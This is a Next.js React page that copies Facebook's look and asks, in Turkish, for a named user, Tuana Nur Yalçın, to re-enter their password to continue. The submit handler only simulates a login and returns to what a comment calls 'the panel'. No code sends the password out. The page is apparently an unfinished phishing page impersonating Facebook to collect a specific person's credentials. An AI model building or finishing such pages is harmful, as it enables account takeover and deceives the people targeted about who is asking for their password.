'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function ReauthPage() {
  const router = useRouter();
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!password) return;
    
    setLoading(true);
    // Simulate login attempt
    setTimeout(() => {
      setLoading(false);
      // For now, redirect back to the panel
      router.back();
    }, 1500);
  };

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#f0f2f5', fontFamily: 'Segoe UI, Helvetica, Arial, sans-serif', margin: 0, padding: 0 }}>
      {/* Header */}
      <header style={{ backgroundColor: '#ffffff', height: '60px', width: '100%', boxShadow: '0 1px 2px rgba(0, 0, 0, 0.1)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 20px', position: 'sticky', top: 0, zIndex: 100 }}>
        <div style={{ color: '#1877f2', fontSize: '32px', fontWeight: 'bold', letterSpacing: '-0.5px' }}>
          facebook
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', fontSize: '14px', fontWeight: '600', color: '#050505' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '50%', backgroundColor: '#145c6e' }}></div>
          <span style={{ cursor: 'pointer' }}>Tuana Nur</span>
          <span style={{ cursor: 'pointer', paddingLeft: '8px', borderLeft: '1px solid #ced0d4' }}>Ana Sayfa</span>
          <span style={{ cursor: 'pointer', fontSize: '10px' }}>▼</span>
        </div>
      </header>

      {/* Main Content */}
      <main style={{ display: 'flex', justifyContent: 'center', paddingTop: '60px', paddingBottom: '40px' }}>
        <div style={{ backgroundColor: '#ffffff', borderRadius: '8px', boxShadow: '0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1)', width: '100%', maxWidth: '600px', border: '1px solid #dddfe2' }}>
          
          {/* Card Header */}
          <div style={{ padding: '16px 20px', borderBottom: '1px solid #e5e5e5' }}>
            <h2 style={{ margin: 0, fontSize: '16px', fontWeight: 'bold', color: '#1c1e21' }}>Devam etmek için lütfen şifrenizi girin</h2>
          </div>

          {/* Card Body */}
          <div style={{ padding: '20px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '20px' }}>
              <div style={{ width: '48px', height: '48px', backgroundColor: '#145c6e', borderRadius: '2px' }}></div>
              <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#1c1e21' }}>Tuana Nur Yalçın</div>
            </div>

            <div style={{ fontSize: '13px', color: '#1c1e21', marginBottom: '20px' }}>
              Ziyaret etmek istediğiniz sayfa için şifrenizi yeniden girmeniz gerekmektedir.
            </div>

            <form onSubmit={handleSubmit}>
              <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                <label style={{ width: '150px', textAlign: 'right', paddingRight: '15px', fontSize: '13px', color: '#606770', fontWeight: 'normal' }}>Şifre</label>
                <div>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    style={{
                      width: '200px',
                      padding: '5px',
                      border: '1px solid #ccd0d5',
                      borderRadius: '0',
                      fontSize: '14px'
                    }}
                  />
                  <div style={{ marginTop: '5px' }}>
                    <a href="#" style={{ color: '#1877f2', fontSize: '12px', textDecoration: 'none' }}>Şifrenizi mi unuttun?</a>
                  </div>
                </div>
              </div>

              {/* Card Footer within form for submission */}
              <div style={{ backgroundColor: '#f5f6f7', padding: '12px 20px', borderTop: '1px solid #e5e5e5', display: 'flex', justifyContent: 'flex-end', marginTop: '30px', marginLeft: '-20px', marginRight: '-20px', marginBottom: '-20px', borderBottomLeftRadius: '8px', borderBottomRightRadius: '8px' }}>
                <button
                  type="submit"
                  disabled={loading}
                  style={{
                    backgroundColor: '#1877f2',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '4px',
                    padding: '0 16px',
                    height: '36px',
                    fontSize: '14px',
                    fontWeight: 'bold',
                    cursor: loading ? 'not-allowed' : 'pointer',
                    opacity: loading ? 0.7 : 1
                  }}
                >
                  {loading ? 'Yükleniyor...' : 'Devam'}
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      <style dangerouslySetInnerHTML={{__html: `
        body { margin: 0; padding: 0; background-color: #f0f2f5; }
      `}} />
    </div>
  );
}
